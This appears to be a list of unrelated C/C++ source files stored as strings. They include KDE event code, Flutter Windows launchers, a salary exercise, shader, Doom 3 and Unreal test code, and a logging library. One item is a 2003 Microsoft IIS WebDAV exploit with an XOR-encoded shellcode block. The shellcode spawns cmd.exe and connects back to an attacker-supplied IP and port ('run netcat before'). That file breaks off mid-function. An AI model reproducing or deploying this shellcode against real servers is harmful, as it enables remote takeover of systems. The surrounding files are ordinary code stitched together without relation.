    "/*\n *   SPDX-FileCopyrightText: 2011-2016 Ivan Cukic <ivan.cukic@kde.org>\n *\n *   SPDX-License-Identifier: GPL-2.0-only OR GPL-3.0-only OR LicenseRef-KDE-Accepted-GPL\n */\n\n// Self\n#include \"Event.h\"\n\n// Local\n#include <QDebug>\n\nEvent::Event()\n    : wid(0)\n    , type(Accessed)\n    , timestamp(QDateTime::currentDateTime())\n{\n}\n\nEvent::Event(const QString &vApplication, quintptr vWid, const QString &vUri, int vType)\n    : application(vApplication)\n    , wid(vWid)\n    , uri(vUri)\n    , type(vType)\n    , timestamp(QDateTime::currentDateTime())\n{\n    Q_ASSERT(!vApplication.isEmpty());\n    Q_ASSERT(!vUri.isEmpty());\n}\n\nEvent Event::deriveWithType(Type type) const\n{\n    Event result(*this);\n    result.type = type;\n    return result;\n}\n\nbool Event::operator==(const Event &other) const\n{\n    return application == other.application && wid == other.wid && uri == other.uri && type == other.type && timestamp == other.timestamp;\n}\n\nQString Event::typeName() const\n{\n    switch (type) {\n    case Accessed:\n        return QStringLiteral(\"Accessed\");\n    case Opened:\n        return QStringLiteral(\"Opened\");\n    case Modified:\n        return QStringLiteral(\"Modified\");\n    case Closed:\n        return QStringLiteral(\"Closed\");\n    case FocussedIn:\n        return QStringLiteral(\"FocussedIn\");\n    case FocussedOut:\n        return QStringLiteral(\"FocussedOut\");\n    default:\n        return QStringLiteral(\"Other\");\n    }\n}\n\nQDebug operator<<(QDebug dbg, const Event &e)\n{\n#ifndef QT_NO_DEBUG_OUTPUT\n    dbg << \"Event(\" << e.application << e.wid << e.typeName() << e.uri << \":\" << e.timestamp << \")\";\n#else\n    Q_UNUSED(e);\n#endif\n    return dbg.space();\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"news\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <cstring>\r\nusing namespace std;\r\nclass person\r\n{\r\n    string name;\r\n    int age, id;\r\n    public:\r\n    void getData()\r\n    {\r\n        cout << \"Enter name: \";\r\n        cin >> name;\r\n        cout << \"Enter age: \";\r\n        cin >> age;\r\n        cout << \"Enter id: \";\r\n        cin >> id;\r\n    }\r\n    void displayData()\r\n    {\r\n        cout << \"Name: \" << name << endl;\r\n        cout << \"Age: \" << age << endl;\r\n        cout << \"ID: \" << id << endl;\r\n    }\r\n};\r\nclass employee : public person{\r\n    string designation;\r\n    public:\r\n    int basic_salary, total_overtime,hourly_rate;\r\n    void getData()\r\n    {\r\n        person::getData();\r\n        cout << \"Enter designation: \";\r\n        cin >> designation;\r\n        cout << \"Enter basic salary: \";\r\n        cin >> basic_salary;\r\n        cout << \"Enter total overtime: \";\r\n        cin >> total_overtime;\r\n        cout << \"Enter hourly rate: \";\r\n        cin >> hourly_rate;\r\n    }\r\n    void displayData()\r\n    {\r\n        person::displayData();\r\n        cout << \"Designation: \" << designation << endl;\r\n        cout << \"Basic salary: \" << basic_salary << endl;\r\n        cout << \"Total overtime: \" << total_overtime << endl;\r\n        cout << \"Hourly rate: \" << hourly_rate << endl;\r\n    }\r\n};\r\nclass computedSalary : public employee{\r\n    int total_salary;\r\n    public:\r\n    void getData()\r\n    {\r\n        employee::getData();\r\n    }\r\n    void displayData()\r\n    {\r\n        employee::displayData();\r\n        total_salary = basic_salary + (total_overtime * hourly_rate);\r\n        cout << \"Total salary: \" << total_salary << endl;\r\n\r\n    }\r\n\r\n};\r\nint main(){\r\n    int n;\r\n    computedSalary c[100];\r\n    cout << \"Enter number of person: \";\r\n    cin >> n;\r\n    for(int i = 0; i < n; i++)\r\n    {\r\n        c[i].getData();\r\n    }\r\n    for(int i = 0; i < n; i++)\r\n    {\r\n        c[i].displayData();\r\n    }\r\n    \r\n    return 0;\r\n}",
    "#include \"glsl_shader_program.hpp\"\n\n#include \"glsl_program.hpp\"\n\n#include <boost/throw_exception.hpp>\n\n#include <iostream>\n#include <sstream>\n\n#if !defined(DNLOAD_GLESV2)\n\n//######################################\n// Global ##############################\n//######################################\n\nGlslShaderProgram::~GlslShaderProgram()\n{\n    cleanup();\n}\n\nvoid GlslShaderProgram::cleanup()\n{\n    if(m_id)\n    {\n        glDeleteProgram(m_id);\n        m_id = 0u;\n    }\n}\n\nbool GlslShaderProgram::compile()\n{\n    cleanup();\n\n    std::string source = read();\n    const GLchar* glsl_parts[1] = { source.c_str() };\n\n    m_id = glCreateShaderProgramv(m_type, static_cast<GLsizei>(1), &(glsl_parts[0]));\n    if(!get_program_link_status(m_id))\n    {\n        std::cout << get_string_with_prepended_line_numbers(source) << \"\\n----\\n\" << get_program_info_log(m_id);\n        return false;\n    }\n    std::cout << \"Program compiled: \\\"\" << source << \"\\\": \" << m_id << std::endl;\n\n    return true;\n}\n\nGLuint GlslShaderProgram::getStage() const\n{\n    switch(m_type)\n    {\n    case GL_VERTEX_SHADER:\n        return GL_VERTEX_SHADER_BIT;\n\n    case GL_FRAGMENT_SHADER:\n        return GL_FRAGMENT_SHADER_BIT;\n\n    case GL_MESH_SHADER_NV:\n        return GL_MESH_SHADER_BIT_NV;\n\n    default:\n        break;\n    }\n\n    std::ostringstream sstr;\n    sstr << \"no stage known for shader of type '\" << m_type << \"'\";\n    BOOST_THROW_EXCEPTION(std::runtime_error(sstr.str()));\n}\n\n#endif\n\n",
    "/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/\n/*\t    29/05/2003 - by Alumni -                   */\n/*              Microsoft IIS WebDAV New Exploit           */\n/*                 spawns shell on port 32768                 */\n/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/\n#include <stdio.h>\n\n#include <winsock.h>\n\n#include <windows.h>\n\n#define SHELLCODELEN 753\n#define NOP 0x90\n#define BUFFERLEN 1024\n#define RET 0x41424344\n#define GMHOFF 30\n#define GPAOFF 38\n#define IPOFF 161\n#define DEFPORT 32768\n//#define DEBUGGEE_FLOW\t// for debug only\n#ifdef DEBUGGEE_FLOW\n#define GMH(long) GetModuleHandle\n#define GPA(long) GetProcAddress\n#else\n#define GMH 0x0100107C // GetModuleHandle@\n#define GPA 0x01001034 // GetProcAddress@\n#endif\n#define XOROFF 11\n#define SOFF 16\nchar prologue[] = \"\\xEB\\x03\" // jmp $+3\n\"\\x58\" // pop eax\n\"\\x50\" // push eax\n\"\\xC3\" // retn\n\"\\xE8\\xF8\\xFF\\xFF\\xFF\" // call $-3\n\"\\xB2\" // mov dl, %key\n\"\\x90\" // %key\n\"\\x33\\xC9\" // xor ecx, ecx\n\"\\x66\\xB9\" // mov cx, shellcodesize\n\"\\x04\\x03\" // shellcodesize = hex(SHELLCODELEN)\n\"\\x04\\x14\" // add al, 0x14\n\"\\x30\\x10\" // xor byte ptr[eax], dl\n\"\\x40\" // inc eax\n\"\\x66\\x49\" // dec cx\n\"\\x67\\xE3\\x02\" // jcxz $+5\n\"\\xEB\\xF6\" // jmp $-8\n;\nchar shellcode[SHELLCODELEN + 1] = \"\\xe8\\x5f\\x02\\x00\\x00\\x8b\\xe8\\x33\\xf6\\x66\\xbe\\x80\"\n\"\\x00\\x03\\xf4\\xc7\\x46\\xf0\\x00\\x00\\x00\\x00\\xc7\\x46\"\n\"\\xf4\\x00\\x00\\x00\\x00\\xb8\\xf2\\x12\\x40\\x00\\x89\\x46\"\n\"\\xf8\\xb8\\xf8\\x12\\x40\\x00\\x89\\x46\\xfc\\x8b\\xd5\\x81\"\n\"\\xc2\\x9e\\x02\\x00\\x00\\x52\\xff\\x56\\xf8\\x89\\x46\\xf4\"\n\"\\x8b\\xd5\\x81\\xc2\\xab\\x02\\x00\\x00\\x52\\xff\\x76\\xf4\"\n\"\\xff\\x56\\xfc\\x68\\x00\\x10\\x00\\x00\\x6a\\x40\\xff\\xd0\"\n\"\\x8b\\xf8\\x8b\\xc7\\x8b\\xfe\\x8b\\xf0\\x83\\xc6\\x20\\x8b\"\n\"\\x47\\xf8\\x89\\x46\\xf8\\x8b\\x47\\xf4\\x89\\x46\\xf4\\x8b\"\n\"\\x47\\xfc\\x89\\x46\\xfc\\x8b\\xd5\\x81\\xc2\\x6e\\x02\\x00\"\n\"\\x00\\x52\\xff\\x56\\xf8\\x89\\x46\\xf0\\x8b\\xd5\\x81\\xc2\"\n\"\\x7e\\x02\\x00\\x00\\x52\\xff\\x76\\xf0\\xff\\x56\\xfc\\x8b\"\n\"\\xd8\\x6a\\x06\\x6a\\x01\\x6a\\x02\\xff\\xd3\\x89\\x06\\x8b\"\n\"\\xd6\\x83\\xc2\\x14\\xb8\"\n\"\\x7f\\x00\\x00\\x01\" // put your ip here (run netcat before, e.g. 127.0.0.1)\n\"\\x89\\x42\\x04\\x66\\xc7\\x02\\x02\\x00\\x66\\xb8\"\n\"\\x80\\x00\" // specify connectious port here (e.g. 32768)\n\"\\x66\\x89\\x42\"\n\"\\x02\\x8b\\xd5\\x81\\xc2\\x8a\\x02\\x00\\x00\\x52\\xff\\x76\"\n\"\\xf0\\xff\\x56\\xfc\\x8b\\xd8\\x6a\\x10\\x8b\\xd6\\x83\\xc2\"\n\"\\x14\\x52\\xff\\x36\\xff\\xd3\\x83\\xf8\\xff\\x0f\\x84\\x84\"\n\"\\x01\\x00\\x00\\x8b\\xd5\\x81\\xc2\\x79\\x02\\x00\\x00\\x52\"\n\"\\xff\\x76\\xf0\\xff\\x56\\xfc\\x8b\\xd8\\x8b\\xd6\\x6a\\x00\"\n\"\\x68\\x64\\x0f\\x00\\x00\\x81\\xc2\\x9c\\x00\\x00\\x00\\x52\"\n\"\\xff\\x36\\xff\\xd3\\xc6\\x84\\x30\\x9c\\x00\\x00\\x00\\x00\"\n\"\\xbb\\x00\\x00\\x00\\x00\\x66\\xb9\\x0c\\x00\\x8a\\x84\\x2b\"\n\"\\x62\\x02\\x00\\x00\\x88\\x84\\x33\\x90\\x00\\x00\\x00\\x43\"\n\"\\x66\\x49\\x66\\x83\\xf9\\x00\\x75\\xe9\\x8b\\xfe\\x81\\xc7\"\n\"\\x84\\x00\\x00\\x00\\xc7\\x07\\x0c\\x00\\x00\\x00\\xc7\\x47\"\n\"\\x04\\x00\\x00\\x00\\x00\\xc7\\x47\\x08\\x01\\x00\\x00\\x00\"\n\"\\x8b\\xfe\\x8b\\xd6\\x8b\\xce\\x81\\xc7\\x84\\x00\\x00\\x00\"\n\"\\x83\\xc2\\x0c\\x83\\xc1\\x10\\x6a\\x00\\x57\\x51\\x52\\x8b\"\n\"\\xd5\\x81\\xc2\\xc9\\x02\\x00\\x00\\x52\\xff\\x76\\xf4\\xff\"\n\"\\x56\\xfc\\x8b\\xd8\\xff\\xd3\\x8b\\xfe\\x83\\xc7\\x34\\xc7\"\n\"\\x07\\x44\\x00\\x00\\x00\\x66\\xc7\\x47\\x30\\x00\\x00\\xc7\"\n\"\\x47\\x2c\\x01\\x01\\x00\\x00\\x8b\\x46\\x10\\x89\\x47\\x3c\"\n\"\\x89\\x47\\x40\\x8b\\xd6\\x8b\\xde\\x8b\\xce\\x81\\xc2\\x90\"\n\"\\x00\\x00\\x00\\x83\\xc3\\x34\\x83\\xc1\\x78\\x51\\x53\\x6a\"\n\"\\x00\\x6a\\x00\\x6a\\x00\\x6a\\x01\\x6a\\x00\\x6a\\x00\\x52\"\n\"\\x6a\\x00\\x8b\\xd5\\x81\\xc2\\xd4\\x02\\x00\\x00\\x52\\xff\"\n\"\\x76\\xf4\\xff\\x56\\xfc\\x8b\\xd8\\xff\\xd3\\x8b\\xd5\\x81\"\n\"\\xc2\\xbd\\x02\\x00\\x00\\x52\\xff\\x76\\xf4\\xff\\x56\\xfc\"\n\"\\x8b\\xd8\\xff\\x76\\x10\\xff\\xd3\\x8b\\xd6\\x83\\xc2\\x08\"\n\"\\x8b\\xd5\\x81\\xc2\\xb7\\x02\\x00\\x00\\x52\\xff\\x76\\xf4\"\n\"\\xff\\x56\\xfc\\x8b\\xd8\\x68\\x88\\x13\\x00\\x00\\xff\\xd3\"\n\"\\x8b\\xd6\\x8b\\xce\\x81\\xc2\\x90\\x00\\x00\\x00\\x83\\xc1\"\n\"\\x08\\x8b\\x5e\\x08\\x6a\\x00\\x51\\x68\\x70\\x0f\\x00\\x00\"\n\"\\x52\\xff\\x76\\x0c\\x8b\\xd5\\x81\\xc2\\xe3\\x02\\x00\\x00\"\n\"\\x52\\xff\\x76\\xf4\\xff\\x56\\xfc\\x8b\\xd8\\xff\\xd3\\x8b\"\n\"\\xd6\\x81\\xc2\\x90\\x00\\x00\\x00\\x6a\\x00\\xff\\x76\\x08\"\n\"\\x52\\xff\\x36\\x8b\\xd5\\x81\\xc2\\x85\\x02\\x00\\x00\\x52\"\n\"\\xff\\x76\\xf0\\xff\\x56\\xfc\\x8b\\xd8\\xff\\xd3\\x8b\\xd5\"\n\"\\x81\\xc2\\x92\\x02\\x00\\x00\\x52\\xff\\x76\\xf0\\xff\\x56\"\n\"\\xfc\\x8b\\xd8\\xff\\x36\\xff\\xd3\\xe9\\x1c\\xfe\\xff\\xff\"\n\"\\x58\\x50\\xc3\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\"\n\"\\x43\\x20\\x20\\x57\\x53\\x32\\x5f\\x33\\x32\\x2e\\x44\\x4c\"\n\"\\x4c\\x00\\x72\\x65\\x63\\x76\\x00\\x73\\x6f\\x63\\x6b\\x65\"\n\"\\x74\\x00\\x73\\x65\\x6e\\x64\\x00\\x63\\x6f\\x6e\\x6e\\x65\"\n\"\\x63\\x74\\x00\\x63\\x6c\\x6f\\x73\\x65\\x73\\x6f\\x63\\x6b\"\n\"\\x65\\x74\\x00\\x4b\\x45\\x52\\x4e\\x45\\x4c\\x33\\x32\\x2e\"\n\"\\x44\\x4c\\x4c\\x00\\x47\\x6c\\x6f\\x62\\x61\\x6c\\x41\\x6c\"\n\"\\x6c\\x6f\\x63\\x00\\x53\\x6c\\x65\\x65\\x70\\x00\\x43\\x6c\"\n\"\\x6f\\x73\\x65\\x48\\x61\\x6e\\x64\\x6c\\x65\\x00\\x43\\x72\"\n\"\\x65\\x61\\x74\\x65\\x50\\x69\\x70\\x65\\x00\\x43\\x72\\x65\"\n\"\\x61\\x74\\x65\\x50\\x72\\x6f\\x63\\x65\\x73\\x73\\x41\\x00\"\n\"\\x52\\x65\\x61\\x64\\x46\\x69\\x6c\\x65\\x00\";\nchar xmlbody[] = \"<?xml version=\\\"1.0\\\"?>\\r\\n<g:searchrequest xmlns:g=\\\"DAV:\\\">\\r\\n\"\n\"<g:sql>\\r\\nSelect \\\"DAV:displayname\\\" from scope()\\r\\n</g:sql>\\r\\n</g:searchrequest>\\r\\n\";\nlong retaddr, buffsize;\nchar * buffer;\nunsigned long getlocalhostip() {\n\tchar buff[128];\n\tin_addr inaddr;\n\tif(!gethostname(buff, 128)) {\n\t\tmemcpy( & inaddr, gethostbyname(buff)->h_addr, 4);\n\t\treturn (inet_addr(inet_ntoa(inaddr)));\n\t}\n\treturn (-1);\n}\nULONG WINAPI AcceptThread(LPVOID lpParam) {\n",
    "/*\n===========================================================================\n\nDoom 3 GPL Source Code\nCopyright (C) 1999-2011 id Software LLC, a ZeniMax Media company.\n\nThis file is part of the Doom 3 GPL Source Code (\"Doom 3 Source Code\").\n\nDoom 3 Source Code is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nDoom 3 Source Code is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with Doom 3 Source Code.  If not, see <http://www.gnu.org/licenses/>.\n\nIn addition, the Doom 3 Source Code is also subject to certain additional terms. You should have received a copy of these additional terms immediately following the terms and conditions of the GNU General Public License which accompanied the Doom 3 Source Code.  If not, please request a copy in writing from id Software at the address below.\n\nIf you have questions concerning this license or the applicable additional terms, you may contact in writing id Software LLC, c/o ZeniMax Media Inc., Suite 120, Rockville, Maryland 20850 USA.\n\n===========================================================================\n*/\n\n#include \"precompiled.h\"\n#pragma hdrstop\n\n\n//===============================================================\n//\n//\tidWinding\n//\n//===============================================================\n\n/*\n=============\nidWinding::ReAllocate\n=============\n*/\nbool idWinding::ReAllocate( int n, bool keep ) {\n\tidVec5 *oldP;\n\n\toldP = p;\n\tn = (n+3) & ~3;\t// align up to multiple of four\n\tp = new idVec5[n];\n\tif ( oldP ) {\n\t\tif ( keep ) {\n\t\t\tmemcpy( p, oldP, numPoints * sizeof(p[0]) );\n\t\t}\n\t\tdelete[] oldP;\n\t}\n\tallocedSize = n;\n\n\treturn true;\n}\n\n/*\n=============\nidWinding::BaseForPlane\n=============\n*/\nvoid idWinding::BaseForPlane( const idVec3 &normal, const float dist ) {\n\tidVec3 org, vright, vup;\n\n\torg = normal * dist;\n\n\tnormal.NormalVectors( vup, vright );\n\tvup *= MAX_WORLD_SIZE;\n\tvright *= MAX_WORLD_SIZE;\n\n\tEnsureAlloced( 4 );\n\tnumPoints = 4;\n\tp[0].ToVec3() = org - vright + vup;\n\tp[0].s = p[0].t = 0.0f;\n\tp[1].ToVec3() = org + vright + vup;\n\tp[1].s = p[1].t = 0.0f;\n\tp[2].ToVec3() = org + vright - vup;\n\tp[2].s = p[2].t = 0.0f;\n\tp[3].ToVec3() = org - vright - vup;\n\tp[3].s = p[3].t = 0.0f;\n}\n\n/*\n=============\nidWinding::Split\n=============\n*/\nint idWinding::Split( const idPlane &plane, const float epsilon, idWinding **front, idWinding **back ) const {\n\tfloat *\t\t\tdists;\n\tbyte *\t\t\tsides;\n\tint\t\t\t\tcounts[3];\n\tfloat\t\t\tdot;\n\tint\t\t\t\ti, j;\n\tconst idVec5 *\tp1, *p2;\n\tidVec5\t\t\tmid;\n\tidWinding *\t\tf, *b;\n\tint\t\t\t\tmaxpts;\n\n\tassert( this && numPoints > 0);\n\n\t// DG: unlikely, but makes sure we don't use uninitialized memory below\n\tif ( numPoints == 0 ) {\n\t\treturn 0; // it's not like the callers check the return value anyway..\n\t}\n\n\tdists = (float *) _alloca( (numPoints+4) * sizeof( float ) );\n\tsides = (byte *) _alloca( (numPoints+4) * sizeof( byte ) );\n\n\tcounts[0] = counts[1] = counts[2] = 0;\n\n\t// determine sides for each point\n\tfor ( i = 0; i < numPoints; i++ ) {\n\t\tdists[i] = dot = plane.Distance( p[i].ToVec3() );\n\t\tif ( dot > epsilon ) {\n\t\t\tsides[i] = SIDE_FRONT;\n\t\t} else if ( dot < -epsilon ) {\n\t\t\tsides[i] = SIDE_BACK;\n\t\t} else {\n\t\t\tsides[i] = SIDE_ON;\n\t\t}\n\t\tcounts[sides[i]]++;\n\t}\n\tsides[i] = sides[0];\n\tdists[i] = dists[0];\n\n\t*front = *back = NULL;\n\n\t// if coplanar, put on the front side if the normals match\n\tif ( !counts[SIDE_FRONT] && !counts[SIDE_BACK] ) {\n\t\tidPlane windingPlane;\n\n\t\tGetPlane( windingPlane );\n\t\tif ( windingPlane.Normal() * plane.Normal() > 0.0f ) {\n\t\t\t*front = Copy();\n\t\t\treturn SIDE_FRONT;\n\t\t} else {\n\t\t\t*back = Copy();\n\t\t\treturn SIDE_BACK;\n\t\t}\n\t}\n\t// if nothing at the front of the clipping plane\n\tif ( !counts[SIDE_FRONT] ) {\n\t\t*back = Copy();\n\t\treturn SIDE_BACK;\n\t}\n\t// if nothing at the back of the clipping plane\n\tif ( !counts[SIDE_BACK] ) {\n\t\t*front = Copy();\n\t\treturn SIDE_FRONT;\n\t}\n\n\tmaxpts = numPoints+4;\t// cant use counts[0]+2 because of fp grouping errors\n\n\t*front = f = new idWinding(maxpts);\n\t*back = b = new idWinding(maxpts);\n\n\tfor (i = 0; i < numPoints; i++) {\n\t\tp1 = &p[i];\n\n\t\tif ( sides[i] == SIDE_ON ) {\n\t\t\tf->p[f->numPoints] = *p1;\n\t\t\tf->numPoints++;\n\t\t\tb->p[b->numPoints] = *p1;\n\t\t\tb->numPoints++;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif ( sides[i] == SIDE_FRONT ) {\n\t\t\tf->p[f->numPoints] = *p1;\n\t\t\tf->numPoints++;\n\t\t}\n\n\t\tif ( sides[i] == SIDE_BACK ) {\n\t\t\tb->p[b->numPoints] = *p1;\n\t\t\tb->numPoints++;\n\t\t}\n\n\t\tif ( sides[i+1] == SIDE_ON || sides[i+1] == sides[i] ) {\n\t\t\tcontinue;\n\t\t}\n\n\t\t// generate a split point\n\t\tp2 = &p[(i+1)%numPoints];\n\n\t\t// always calculate the split going from the same side\n\t\t// or minor epsilon issues can happen\n\t\tif ( sides[i] == SIDE_FRONT ) {\n\t\t",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sql_db\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"UEST.h\"\n\n#include \"Modules/ModuleManager.h\"\n\nFUESTTestBase::FUESTTestBase(const FString& InName, bool bIsComplex)\n    : FAutomationTestBase(InName, bIsComplex)\n{\n}\n\nuint32 FUESTTestBase::GetRequiredDeviceNum() const\n{\n\treturn 1;\n}\n\nuint32 FUESTTestBase::GetTestFlags() const\n{\n\treturn EAutomationTestFlags::ApplicationContextMask | EAutomationTestFlags::ProductFilter;\n}\n\nvoid FUESTTestBase::GetTests(TArray<FString>& OutBeautifiedNames, TArray<FString>& OutTestCommands) const\n{\n\tif (TestMethods.Num())\n\t{\n\t\tTestMethods.GenerateKeyArray(OutBeautifiedNames);\n\t\tTestMethods.GenerateKeyArray(OutTestCommands);\n\t}\n\telse\n\t{\n\t\tOutBeautifiedNames.Add(GetBeautifiedTestName());\n\t\tOutTestCommands.AddDefaulted(1);\n\t}\n}\n\nstatic FString ExtractTestMethod(const FString& InTestName)\n{\n\tauto Result = InTestName;\n\tconst auto Pos = Result.Find(TEXT(\" \"));\n\n\tif (Pos != INDEX_NONE)\n\t{\n\t\tResult.RightChopInline(Pos + 1);\n\t}\n\n\treturn Result;\n}\n\nFString FUESTTestBase::GetTestSourceFileName(const FString& InTestName) const\n{\n\tif (TestMethods.Num())\n\t{\n\t\tconst auto& TestMethod = ExtractTestMethod(InTestName);\n\t\tif (const auto* TestInfo = TestMethods.Find(TestMethod); ensure(TestInfo))\n\t\t{\n\t\t\treturn TestInfo->FileName;\n\t\t}\n\t}\n\n\treturn Super::GetTestSourceFileName(InTestName);\n}\n\nint32 FUESTTestBase::GetTestSourceFileLine(const FString& InTestName) const\n{\n\tif (TestMethods.Num())\n\t{\n\t\tconst auto& TestMethod = ExtractTestMethod(InTestName);\n\t\tif (const auto* TestInfo = TestMethods.Find(TestMethod); ensure(TestInfo))\n\t\t{\n\t\t\treturn TestInfo->FileLine;\n\t\t}\n\t}\n\n\treturn Super::GetTestSourceFileLine(InTestName);\n}\n\nbool FUESTTestBase::RunTest(const FString& InTestName)\n{\n\tif (TestMethods.Num())\n\t{\n\t\tif (const auto* TestInfo = TestMethods.Find(InTestName); ensure(TestInfo))\n\t\t{\n\t\t\t// TODO: Add things like BEFORE_EACH() {...}, AFTER_EACH() {...}?\n\t\t\tTestInfo->Delegate.Execute();\n\t\t}\n\t}\n\n\t// TODO: Should we mark test class without test methods as failed?\n\n\treturn true;\n}\n\nIMPLEMENT_MODULE(FDefaultModuleImpl, UEST)\n",
    "/*\n * Created by Joges on 04.08.2024.\n */ \n#include \"calog.h\"\n\ninline calog::CalogContext formatContext;\n\ntemplate<typename T>\nstd::string calog::fmt::format(const std::string &fmt, const T &value) {\n    std::ostringstream ostringstream;\n    ostringstream << value;\n    const auto pos = fmt.find(\"{}\");\n    if (pos == std::string::npos) return fmt;\n    std::string result = fmt;\n    result.replace(pos, 2, ostringstream.str());\n    return result;\n}\n\ntemplate<typename T, typename... Args>\nstd::string calog::fmt::format(const std::string &fmt, const T &value, const Args&... arguments) {\n    std::string result = format(fmt, value);\n    return format(result, arguments...);\n}\n\nstd::string calog::fmt::format(const std::string &fmt) {\n    return fmt;\n}\n\nstd::string calog::fmt::replace(std::string fmt, const std::string& source, const std::string& target) {\n    bool breakOut = true;\n    while (breakOut)\n        if (const auto pos = fmt.find(source); pos == std::string::npos) breakOut = false;\n        else fmt = fmt.replace(pos, source.size(), target);\n    return fmt;\n}\n\nstd::string calog::color::get(const Color& color, const std::string& text) {\n    return fmt::format(\"\\033[38;2;{};{};{}m{}\\033[0m\", color.r, color.g, color.b, text);\n}\n\nvoid calog::init() {\n#if __WIN32__\n    const auto hOut = GetStdHandle(STD_OUTPUT_HANDLE);\n    DWORD dwMode = 0;\n    GetConsoleMode(hOut, &dwMode);\n    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;\n    SetConsoleMode(hOut, dwMode);\n#endif\n}\n\nstd::string calog::toString(const FormatComponent e) {\n    switch (e) {\n        case TIME: return \"TIME\";\n        case PROFILE: return \"PROFILE\";\n        case MESSAGE: return \"MESSAGE\";\n        default: return \"\";\n    }\n}\n\nstd::string calog::toString(const FormatProfile e) {\n    switch (e) {\n        case INFO: return color::get({67, 188, 122}, \"INFO\");\n        case WARN: return color::get({253, 171, 131}, \"WARN\");\n        case DEBUG: return color::get({255, 111, 0}, \"DEBUG\");\n        default: return color::get({244, 67, 96}, \"ERROR\");\n    }\n\n}\n\ncalog::FormatComponent calog::fromStringToComponent(const std::string &string) {\n    static const std::unordered_map<std::string, FormatComponent> map = {\n        {\"TIME\", TIME},\n        {\"PROFILE\", PROFILE},\n        {\"MESSAGE\", MESSAGE},\n    };\n    const auto item = map.find(string);\n    return item->second;\n}\n\ncalog::FormatProfile calog::fromStringToProfile(const std::string &string) {\n    static const std::unordered_map<std::string, FormatProfile> map = {\n        {\"INFO\", INFO},\n        {\"WARN\", WARN},\n        {\"ERRO\", ERRO},\n        {\"DEBUG\", DEBUG},\n    };\n    const auto item = map.find(string);\n    return item->second;\n}\n\nstd::string calog::getComponent(const FormatComponent component) {\n    switch (component) {\n        case TIME: {\n            time_t rawtime;\n            time(&rawtime);\n            const tm *timeinfo = localtime(&rawtime);\n            char buffer[9];\n            strftime(buffer, sizeof(buffer), \"%H:%M:%S\", timeinfo);\n            return std::string{buffer};\n        }\n        default: return \"\";\n    }\n}\n\ncalog::CalogContext& calog::getFormatContext() { return formatContext; }\n\nvoid calog::setProfile(const FormatProfile profile) {\n    formatContext.profile = profile;\n}\n\nvoid calog::clear() {\n#ifdef _WIN32\n    system(\"cls\");\n#else\n    system(\"clear\");\n#endif\n}\n\nvoid calog::log(const std::string& fmt) {\n    auto format = formatContext.format;\n    format = fmt::replace(format, \"{TIME}\", getComponent(TIME));\n    format = fmt::replace(format, \"{PROFILE}\", toString(formatContext.profile));\n    format = fmt::replace(format, \"{MESSAGE}\", fmt);\n    std::cout << format << \"\\n\";\n}\n\ntemplate<typename T>\nvoid calog::log(const std::string& fmt, const T& value) {\n    log(fmt::format(fmt, value));\n}\n\ntemplate<typename T, typename... Args>\nvoid calog::log(const std::string& fmt, const T& value, const Args&... arguments) {\n    const auto output = fmt::format(fmt, value);\n    log(output, arguments...);\n}",
